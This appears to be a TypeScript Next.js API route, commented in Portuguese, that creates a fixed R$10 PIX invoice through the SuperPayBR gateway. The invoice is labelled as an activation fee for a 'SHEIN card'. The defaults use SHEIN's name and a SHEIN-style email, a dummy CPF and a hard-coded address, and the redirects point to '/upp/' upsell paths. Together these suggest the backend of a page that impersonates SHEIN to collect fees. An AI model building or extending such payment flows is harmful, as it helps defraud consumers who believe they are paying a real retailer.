import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("💳 === CRIANDO FATURA ATIVAÇÃO SUPERPAYBR ===")

    const body = await request.json()
    const amount = 10.0 // Valor fixo para ativação

    // Credenciais SuperPayBR
    const token = process.env.SUPERPAY_TOKEN
    const secretKey = process.env.SUPERPAY_SECRET_KEY
    const apiUrl = process.env.SUPERPAY_API_URL

    if (!token || !secretKey || !apiUrl) {
      return NextResponse.json(
        {
          success: false,
          error: "Credenciais SuperPayBR não configuradas",
        },
        { status: 500 },
      )
    }

    // Gerar External ID único
    const externalId = `ACTIVATION_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`

    // PASSO 1: Autenticação Basic Auth
    const credentials = `${token}:${secretKey}`
    const base64Credentials = Buffer.from(credentials).toString("base64")

    let accessToken = null

    const authUrls = [`${apiUrl}/auth`, `${apiUrl}/token`]

    for (const authUrl of authUrls) {
      try {
        const authResponse = await fetch(authUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Accept: "application/json",
            Authorization: `Basic ${base64Credentials}`,
          },
          body: JSON.stringify({
            grant_type: "client_credentials",
          }),
        })

        if (authResponse.ok) {
          const authData = await authResponse.json()
          accessToken = authData.access_token || authData.token
          if (accessToken) break
        }
      } catch (error) {
        console.log(`❌ Erro auth em ${authUrl}:`, error)
      }
    }

    if (!accessToken) {
      return NextResponse.json(
        {
          success: false,
          error: "Falha na autenticação SuperPayBR",
        },
        { status: 401 },
      )
    }

    // PASSO 2: Criar fatura de ativação
    const invoiceData = {
      client: {
        name: body.customerName || "Cliente SHEIN",
        document: (body.customerCpf || "00000000000").replace(/\D/g, ""),
        email: body.customerEmail || "cliente@shein.com",
        phone: (body.customerPhone || "11999999999").replace(/\D/g, ""),
        address: {
          street: "Rua Principal",
          number: "123",
          neighborhood: "Centro",
          city: "São Paulo",
          state: "SP",
          zipcode: "01001000",
        },
        ip: request.headers.get("x-forwarded-for") || "127.0.0.1",
      },
      payment: {
        external_id: externalId,
        type: "pix",
        due_date: new Date(Date.now() + 30 * 60 * 1000).toISOString().split("T")[0],
        description: "Taxa de Ativação - Cartão SHEIN",
        amount: amount,
        webhook_url: process.env.SUPERPAY_WEBHOOK_URL,
        return_url: `${request.nextUrl.origin}/upp/success`,
        cancel_url: `${request.nextUrl.origin}/upp/001`,
      },
    }

    const createUrls = [`${apiUrl}/invoices`, `${apiUrl}/payment`, `${apiUrl}/create`]

    let responseData = null

    for (const createUrl of createUrls) {
      try {
        const createResponse = await fetch(createUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Accept: "application/json",
            Authorization: `Bearer ${accessToken}`,
          },
          body: JSON.stringify(invoiceData),
        })

        if (createResponse.ok) {
          responseData = await createResponse.json()
          break
        }
      } catch (error) {
        console.log(`❌ Erro em ${createUrl}:`, error)
      }
    }

    if (!responseData) {
      return NextResponse.json(
        {
          success: false,
          error: "Falha ao criar fatura de ativação SuperPayBR",
        },
        { status: 500 },
      )
    }

    // Extrair dados PIX
    let pixPayload = ""
    let qrCodeImage = ""
    let invoiceId = ""

    const findPixData = (obj: any, depth = 0): void => {
      if (!obj || typeof obj !== "object" || depth > 10) return

      for (const [key, value] of Object.entries(obj)) {
        if ((key === "id" || key === "invoice_id") && typeof value === "string" && !invoiceId) {
          invoiceId = value
        }

        if (
          (key === "payload" || key === "pix_code" || key === "qrcode") &&
          typeof value === "string" &&
          value.length > 50
        ) {
          pixPayload = value
        }

        if ((key === "qrcode_image" || key === "qr_code" || key === "image") && typeof value === "string") {
          qrCodeImage = value
        }

        if (typeof value === "object" && value !== null) {
          findPixData(value, depth + 1)
        }
      }
    }

    findPixData(responseData)

    if (!pixPayload) {
      return NextResponse.json(
        {
          success: false,
          error: "PIX payload não encontrado na resposta",
        },
        { status: 500 },
      )
    }

    const qrCodeUrl =
      qrCodeImage || `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=300&format=png&margin=1`

    const response = {
      success: true,
      data: {
        id: invoiceId || externalId,
        invoice_id: invoiceId || externalId,
        external_id: externalId,
        pix: {
          payload: pixPayload,
          image: qrCodeUrl,
          qr_code: qrCodeUrl,
        },
        status: {
          code: 1,
          title: "Aguardando Pagamento",
          text: "pending",
        },
        valores: {
          bruto: Math.round(amount * 100),
          liquido: Math.round(amount * 100),
        },
        vencimento: {
          dia: new Date(Date.now() + 30 * 60 * 1000).toISOString().split("T")[0],
        },
        type: "real",
      },
    }

    console.log("✅ Fatura de ativação SuperPayBR criada!")
    return NextResponse.json(response)
  } catch (error) {
    console.error("❌ Erro ao criar fatura de ativação:", error)
    return NextResponse.json(
      {
        success: false,
        error: "Erro interno ao criar fatura de ativação",
        details: error instanceof Error ? error.message : "Erro desconhecido",
      },
      { status: 500 },
    )
  }
}

export async function GET(request: NextRequest) {
  return NextResponse.json(
    {
      success: false,
      error: "Método GET não suportado. Use POST para criar fatura de ativação.",
    },
    { status: 405 },
  )
}
